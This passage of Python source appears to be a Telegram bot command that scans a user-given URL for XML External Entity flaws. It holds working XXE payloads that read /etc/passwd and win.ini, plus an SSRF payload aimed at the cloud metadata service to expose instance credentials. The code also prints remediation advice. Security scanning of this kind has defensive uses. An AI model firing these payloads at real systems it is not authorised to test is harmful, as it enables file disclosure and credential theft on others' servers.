    """/xxe <url> — XML External Entity injection test"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown'); return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ `{_active_scans.get(uid)}` running — `/stop` နှိပ်ပါ", parse_mode='Markdown'); return
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/xxe https://api.example.com/parse`\n\n"
            "🔴 *XXE (XML External Entity) Injection Test*\n\n"
            "Tests XML-consuming endpoints for:\n"
            "  • Classic external entity (`SYSTEM file:///etc/passwd`)\n"
            "  • Blind XXE (OOB via DNS/HTTP callback)\n"
            "  • Parameter entity injection\n"
            "  • DOCTYPE declaration injection\n"
            "  • Error-based XXE\n\n"
            "⚠️ _Authorized testing only_", parse_mode='Markdown'); return
    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown'); return
    _active_scans.set(uid, "XXE Test")
    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🔴 *XXE Test — `{domain}`*\n\n⏳ Sending XML payloads...",
        parse_mode='Markdown')

    XXE_PAYLOADS = [
        # Classic file read
        ('classic_etc_passwd',
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
         ['root:', 'daemon:', 'bin:', 'nobody:']),
        # Windows file read
        ('classic_win',
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
         ['[fonts]', '[extensions]', 'for 16-bit app']),
        # Error-based XXE
        ('error_based',
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
         '<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM \'file:///nonexistent/%xxe;\'>">'
         '%eval;%err;]><foo/>',
         ['/etc/passwd', 'root:', 'java.io.FileNotFoundException']),
        # Billion laughs (DoS test — safe small version)
        ('billion_laughs_safe',
         '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
         ['lol']),
        # SSRF via XXE
        ('ssrf_via_xxe',
         '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
         ['ami-id', 'instance-id', 'public-ipv4', 'security-credentials']),
    ]

    findings = []
    try:
        async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=15)) as session:
            for name, payload, indicators in XXE_PAYLOADS:
                try:
                    for ct in ['application/xml', 'text/xml']:
                        async with session.post(
                                url, data=payload,
                                headers={**_get_headers(), 'Content-Type': ct},
                                ssl=False) as r:
                            if r.status in (200, 500, 400):
                                body = await r.text(errors='replace')
                                hits = [ind for ind in indicators if ind.lower() in body.lower()]
                                if hits:
                                    findings.append({
                                        'name': name,
                                        'status': r.status,
                                        'indicators': hits,
                                        'content_type': ct,
                                    })
                                    break
                except Exception:
                    pass
                await asyncio.sleep(0.3)

        out = [
            f"🔴 *XXE Test — `{domain}`*",
            "━" * 20,
            f"📊 Payloads tested: `{len(XXE_PAYLOADS)}`",
            "",
        ]
        if findings:
            out.append(f"⚠️ *VULNERABLE — {len(findings)} XXE vector(s) found!*")
            for f in findings:
                out.append(f"\n  🔴 *{f['name']}* (HTTP {f['status']}, `{f['content_type']}`)")
                out.append(f"     Indicators: `{', '.join(f['indicators'][:3])}`")
            out += [
                "",
                "*🔧 Fix:*",
                "  • Disable external entity processing:",
                "    PHP: `libxml_disable_entity_loader(true);`",
                "    Java: `factory.setFeature(XMLConst.DISALLOW_DOCTYPE, true);`",
                "    Python: `defusedxml` library သုံးပါ",
                "  • Use JSON instead of XML where possible",
                "  • Whitelist allowed XML schemas",
            ]
        else:
            out.append("✅ *No XXE vulnerabilities detected.*")
            out.append(f"_All `{len(XXE_PAYLOADS)}` payloads returned no indicators._")
        out.append("\n⚠️ _Authorized testing only_")
        await msg.edit_text("\n".join(out), parse_mode='Markdown')
    except Exception as e:
        await msg.edit_text(f"❌ *XXE test failed:* `{str(e)[:100]}`", parse_mode='Markdown')
    finally:
        _active_scans.pop(uid, None)


